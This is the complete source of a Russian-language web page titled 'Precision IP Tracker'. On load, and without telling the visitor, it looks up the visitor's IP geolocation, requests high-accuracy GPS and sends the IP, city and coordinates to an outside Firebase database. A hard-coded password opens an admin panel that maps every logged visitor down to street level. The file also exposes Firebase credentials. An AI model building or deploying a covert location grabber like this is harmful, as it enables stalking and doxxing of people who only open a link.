<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Precision IP Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { background: #141414; padding: 20px; border-radius: 20px; width: 98%; max-width: 1200px; height: 90vh; border: 1px solid #333; display: flex; flex-direction: column; }
        .hidden { display: none; }
        
        .admin-layout { display: grid; grid-template-columns: 320px 1fr; gap: 15px; flex-grow: 1; min-height: 0; }
        #map { border-radius: 15px; border: 1px solid #007bff; height: 100%; width: 100%; }
        #logs { overflow-y: auto; background: #000; padding: 10px; border-radius: 15px; border: 1px solid #222; }
        
        .log-item { background: #1a1a1a; margin-bottom: 10px; padding: 12px; border-radius: 10px; border-left: 4px solid #007bff; cursor: pointer; transition: 0.2s; font-size: 0.85em; }
        .log-item:hover { background: #252525; border-left-color: #00ff88; }
        
        button { background: #007bff; color: white; border: none; padding: 12px 25px; cursor: pointer; border-radius: 8px; font-weight: bold; }
        input { padding: 12px; width: 250px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; text-align: center; }
        
        .status-gps { color: #00ff88; font-size: 10px; font-weight: bold; }
        .status-ip { color: #888; font-size: 10px; }
    </style>
</head>
<body>

<div class="container">
    <div id="code-step">
        <h2>Система мониторинга</h2>
        <p>Для доступа к панели управления введите секретный код:</p>
        <input type="password" id="accessCode" placeholder="Код...">
        <br><br>
        <button onclick="checkCode()">Войти в систему</button>
    </div>

    <div id="result-step" class="hidden">
        <h3 style="margin: 0 0 10px 0; color: #007bff;">Панель управления трафиком</h3>
        <div class="admin-layout">
            <div id="logs">Загрузка данных...</div>
            <div id="map"></div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { 
        apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
        authDomain: "flutter-ai-playground-caf0d.firebaseapp.com", 
        projectId: "flutter-ai-playground-caf0d", 
        storageBucket: "flutter-ai-playground-caf0d.firebasestorage.app", 
        messagingSenderId: "155816311480", 
        appId: "1:155816311480:web:a0456fcc4681e62837924d",
        databaseURL: "https://cheatip-default-rtdb.firebaseio.com"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const SECRET_CODE = "HTMLKODEYOURIP";
    let map, markers = {};

    // --- ЛОГИКА СБОРА ДАННЫХ (ЗАПУСКАЕТСЯ СРАЗУ) ---
    async function startTracking() {
        try {
            // 1. Получаем данные по IP (сразу)
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();
            
            let visitId = null;

            const sendData = (lat, lng, method) => {
                const payload = {
                    ip: ipData.ip,
                    city: ipData.city || "Unknown",
                    lat: lat,
                    lng: lng,
                    method: method,
                    time: new Date().toLocaleString('ru-RU'),
                    timestamp: serverTimestamp()
                };
                push(ref(db, 'visits'), payload);
            };

            // Отправляем базовые данные по IP
            sendData(ipData.latitude, ipData.longitude, "IP-Geo");

            // 2. Пытаемся уточнить через GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendData(pos.coords.latitude, pos.coords.longitude, "GPS (Precise)");
                    },
                    null,
                    { enableHighAccuracy: true }
                );
            }
        } catch (e) { console.error("Tracking error", e); }
    }

    startTracking();

    // --- ЛОГИКА АДМИНКИ ---
    window.checkCode = function() {
        if (document.getElementById('accessCode').value === SECRET_CODE) {
            document.getElementById('code-step').classList.add('hidden');
            document.getElementById('result-step').classList.remove('hidden');
            setTimeout(initMap, 300);
        } else { alert("Доступ запрещен"); }
    }

    function initMap() {
        map = L.map('map', { zoomControl: true }).setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        loadData();
    }

    function loadData() {
        onValue(ref(db, 'visits'), (snapshot) => {
            const data = snapshot.val();
            const logsDiv = document.getElementById('logs');
            logsDiv.innerHTML = '';
            
            if (!data) return;

            const entries = Object.entries(data);
            entries.forEach(([key, user], index) => {
                const num = index + 1;
                const isGPS = user.method.includes("GPS");
                
                // Создаем элемент списка
                const div = document.createElement('div');
                div.className = 'log-item';
                div.innerHTML = `
                    <b>#${num}</b> ${isGPS ? '<span class="status-gps">[GPS]</span>' : '<span class="status-ip">[IP]</span>'}<br>
                    <span style="color:#00ff88">${user.ip}</span><br>
                    ${user.city} | <small>${user.time}</small>
                `;
                
                // При клике на лог — приближаем карту
                div.onclick = () => {
                    map.flyTo([user.lat, user.lng], 16, { duration: 1.5 });
                };
                
                logsDiv.prepend(div);

                // Ставим простую метку
                if (!markers[key]) {
                    const m = L.marker([user.lat, user.lng]).addTo(map)
                        .bindPopup(`<b>Посетитель #${num}</b><br>IP: ${user.ip}<br>Точность: ${user.method}`);
                    markers[key] = m;
                }
            });
        });
    }
</script>
</body>
</html>
